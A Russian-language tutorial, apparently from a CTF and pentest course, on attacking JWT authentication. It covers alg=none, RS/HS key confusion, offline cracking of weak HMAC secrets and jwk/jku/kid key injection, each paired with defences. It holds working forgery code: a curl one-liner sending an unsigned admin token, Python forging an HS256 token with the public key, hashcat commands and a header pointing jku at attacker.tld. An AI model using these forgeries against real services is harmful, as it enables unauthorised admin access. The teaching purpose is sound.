## Вопрос, с которого всё начинается

Приложение отдаёт клиенту токен вида `xxxxx.yyyyy.zzzzz` — это JWT. Внутри
лежат права пользователя, а третий сегмент — подпись, которая должна защищать
эти права от подделки. Вопрос: если подпись криптографически корректна, можно ли
всё равно подделать токен, выдав себя за администратора?

Оказывается, можно — и почти всегда. Дело в том, что JWT несёт в себе **и
данные, и указание, как их проверять** (поле `alg` в заголовке). Если сервер
доверяет второму, атакующий переписывает первое. Ниже мы проведём две
классические атаки на реальном токене.

## Наш пример: токен с RS256

Сервер подписал токен своим RSA-ключом алгоритмом `RS256`. Декодируем его (два
первых сегмента — это просто base64url):

```
header : {'alg': 'RS256', 'typ': 'JWT'}
payload: {'sub': 'user1', 'role': 'user'}
```

Публичный ключ сервера лежит в открытом доступе (иначе клиенты не смогли бы
проверять подписи). Наша цель — превратить `role: user` в `role: admin`.

## Шаг 1: из чего состоит JWT

JWT — это три сегмента, разделённые точками, каждый закодирован **base64url без
padding**:

```
base64url(header) . base64url(payload) . base64url(signature)
```

- **header** — JSON с полями `alg` (алгоритм подписи) и `typ`, плюс опциональные
  `kid`, `jwk`, `jku`, `x5u`;
- **payload** — JSON с «claims»: `sub`, `iss`, `exp`, `role` и так далее;
- **signature** — подпись над строкой `header.payload`.

Алгоритмы делятся на два класса: **симметричные** (`HS256/384/512` — HMAC, ключ
один и на подпись, и на проверку) и **асимметричные** (`RS256` — RSA,
`ES256` — ECDSA, `EdDSA` — Ed25519). Есть ещё `none` — «без подписи». Важно не
путать: **JWS** — это подпись (3 части), **JWE** — шифрование (5 частей), а
**JWK/JWKS** — формат описания ключей.

## Шаг 2: alg=none — подпись, которой нет

Самая простая атака. Если сервер принимает `alg: none`, подпись не нужна — третий
сегмент оставляют пустым:

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s "http://target/admin" -H "Authorization: Bearer ${HEADER}.${PAYLOAD}."
```

Защита простая, но обязательная: на сервере должен быть **жёсткий список
разрешённых алгоритмов**, и `none` в него не входит никогда.

## Шаг 3: RS/HS confusion — публичный ключ как секрет

Это атака на путаницу алгоритмов. Сервер настроен на `RS256` и проверяет подпись
**публичным** ключом. Атакующий меняет `alg` на `HS256` — а это уже симметричный
HMAC. Если библиотека слепо следует `alg` из токена и в качестве HMAC-секрета
берёт тот же публичный ключ (он ведь «ключ»!), то подпись сойдётся.

Собираем поддельный токен вручную: заголовок с `alg=HS256`, наш payload, а
подпись — HMAC-SHA256 с секретом, равным **байтам `public.pem`**:

```python
hdr = b64e(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
pl  = b64e(json.dumps({"sub":"admin","role":"admin"},separators=(",",":")).encode())
sig = hmac.new(pub_pem, f"{hdr}.{pl}".encode(), hashlib.sha256).digest()
forged = f"{hdr}.{pl}.{b64e(sig)}"
```

## Полный прогон от начала до конца

```
$ python3 jwt_demo.py
header : {'alg': 'RS256', 'typ': 'JWT'}
payload: {'sub': 'user1', 'role': 'user'}

forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZ ...
naive server accepts forged HS256 token: True

weak-secret token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.b8CWAx7YxOtsV9eBUuWrPcra1TYFAbaSZSvHJC-RpIc
cracked HS256 secret: hunter2
```

Первая часть — RS/HS confusion: наивный сервер принял наш HS256-токен (с ролью
`admin`), потому что взял алгоритм из заголовка, а «секретом» для HMAC послужил
публичный RSA-ключ. Асимметричная защита обойдена целиком. Вторую часть разберём
ниже.

## Шаг 4: слабый HMAC-секрет — офлайн-подбор

Если сервер использует `HS256`, секрет один и тот же для подписи и проверки. Если
он слабый (например, `hunter2`), его подбирают **офлайн** — сервер в подборе не
участвует, значит никаких блокировок и логов:

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt   # mode 16500 = JWT
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

В нашем демо мы эмулировали это маленьким словарём и нашли секрет `hunter2`.
Имея секрет, подделываем любой payload тем же ключом. Важно: для брута нужен
**полный** токен `header.payload.signature`, без переводов строки.

## Шаг 5: подмена ключа — jwk, jku, kid

Иногда сервер сам просит токен указать, **где взять ключ проверки**. Тогда атака
не ломает криптографию вовсе — мы просто подсовываем свой ключ:

- **`jwk`** — публичный ключ **встроен в заголовок**. Если сервер ему доверяет,
  мы кладём туда свой ключ и подписываем им токен;
- **`jku`** — URL к набору ключей JWKS. Если сервер скачивает ключ по URL без
  белого списка — подмена ключа и заодно SSRF;
- **`x5u`** — URL X.509-сертификата, та же логика;
- **`kid`** — идентификатор ключа. Через него бывают path traversal
  (`../../dev/null`), SQL-инъекция в поиске ключа или подмена на «ключ `none`».

Пример зловредного заголовка:

```json
{"alg":"RS256","jku":"https://attacker.tld/jwks.json","kid":"k1"}
```

Сервер идёт по нашему URL, забирает наш ключ и проверяет нашу подпись. Защита:
whitelist для `jku`/`x5u`, никогда не доверять `jwk` из токена, валидировать `kid`
(не подставлять в путь или SQL).

## JWE: когда токен не подписан, а зашифрован

Не всё, что похоже на JWT, — подпись. **JWE** (JSON Web Encryption) состоит из
**пяти** частей: `header.encrypted_key.iv.ciphertext.tag`. Заголовок содержит
`alg` (как обёрнут ключ шифрования контента: `RSA-OAEP`, `A128KW`, `dir`,
`ECDH-ES`) и `enc` (как шифруется контент: `A256GCM`, `A128CBC-HS256`).

```python
h, ek, iv, ct, tag = token.split('.')
def d(s): return base64.urlsafe_b64decode(s + '='*(-len(s)%4))
print(json.loads(d(h)))
```

Типичные ошибки: принимается `alg: dir`/`none` без проверки; ключ лежит в
заголовке (`jwk`); **повтор IV** (ломает GCM — см. `crypto-gcm`); не проверяется
тег. Часто «JWE» в CTF — это просто обфусцированный JWS, и после декодирования
применимы все атаки выше.

## Что мы теперь знаем

- JWT = `header.payload.signature` в base64url; `alg` в заголовке говорит серверу,
  как проверять подпись.
- `alg=none` опасен, если сервер не ограничивает список алгоритмов.
- RS/HS confusion: подписываем HMAC, используя публичный ключ как секрет —
  асимметрия обходится, если сервер выводит `alg` из токена.
- Поля `jwk`/`jku`/`x5u` позволяют указать серверу «где взять ключ» — подмена
  ключа и SSRF, если нет whitelist.
- Слабый HMAC-секрет подбирается офлайн (hashcat `-m 16500`, john).
- `kid` (идентификатор ключа) бывает уязвим к path traversal и SQLi.

## Справочная таблица атак

| Атака | Условие | Инструмент |
|-------|---------|-----------|
| alg=none | сервер принимает без подписи | `jwt_tool -X a` |
| RS/HS confusion | `alg` из токена, есть публичный ключ | `jwt_tool -X k -pk` |
| jwk injection | доверие встроенному ключу | `jwt_tool -X i` |
| jku/x5u SSRF | загрузка ключа по URL | `jwt_tool -X s` |
| weak HMAC secret | HS256, слабый секрет | `hashcat -m 16500` |
| kid traversal/SQLi | `kid` в пути/запросе | ручной / `sqlmap` |

## Куда дальше

JWT — это мост между криптографией и вебом, поэтому дальше логично `crypto-hmac`,
где мы разберём **length extension** для `H(secret||msg)`, и `crypto-merkle`
про подделку MAC. А главное запомни: **никогда не выводите алгоритм проверки из
самого токена — алгоритм должен быть зафиксирован на сервере, а `none` запрещён**.

## Где пригодится

- **CTF (hard)** — подделка JWT, confusion, jku, слабый секрет.
- **Bug bounty** — аутентификация на JWT в реальных приложениях, OAuth/OIDC.
- **Пентест API** — токены доступа, refresh-токены, микросервисы.
- **Аудит** — проверка корректности валидации JWT/JWS/JWE.
- **Крипто-разработка** — whitelist алгоритмов, безопасное хранение ключей.
